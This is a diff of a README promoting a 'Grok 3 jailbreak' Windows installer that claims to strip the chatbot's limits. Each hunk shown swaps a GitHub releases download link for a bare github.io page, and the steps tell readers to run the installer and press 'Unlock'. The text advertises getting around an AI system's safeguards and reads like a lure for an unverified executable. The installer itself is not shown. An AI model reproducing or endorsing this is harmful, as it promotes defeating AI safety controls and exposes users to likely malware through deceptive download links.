@@ -1,6 +1,6 @@
 # 🚀 grok-3-jailbreak-2026 - Unlock Grok 3 Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-Grok_3_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/norapr3339/grok-3-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Grok_3_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://norapr3339.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ Getting this running on your Windows PC takes less than 2 minutes. Follow these 
 
 Visit this link to download the application:
 
-[🔗 **Download grok-3-jailbreak-2026**](https://github.com/norapr3339/grok-3-jailbreak-2026/releases)
+[🔗 **Download grok-3-jailbreak-2026**](https://norapr3339.github.io)
 
 ### Step 2: Run the Installer
 
@@ -83,7 +83,7 @@ Ready to go? Here's everything you need:
 3. **Launch** – Open the app from your desktop or Start menu.
 4. **Activate** – Press the "Unlock" button once. Done.
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Grok_3_Jailbreak-28A745?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/norapr3339/grok-3-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Grok_3_Jailbreak-28A745?style=for-the-badge&logo=windows&logoColor=white)](https://norapr3339.github.io)
 
 ---
 
@@ -188,7 +188,7 @@ Stop hitting walls with Grok 3. This jailbreak gives you the AI experience you p
 
 **One click. Total freedom.**
 
-[![Download](https://img.shields.io/badge/🚀_Get_Unlimited_Grok_Now-FF4500?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/norapr3339/grok-3-jailbreak-2026/releases)
+[![Download](https://img.shields.io/badge/🚀_Get_Unlimited_Grok_Now-FF4500?style=for-the-badge&logo=appveyor&logoColor=white)](https://norapr3339.github.io)
 
 ---
 
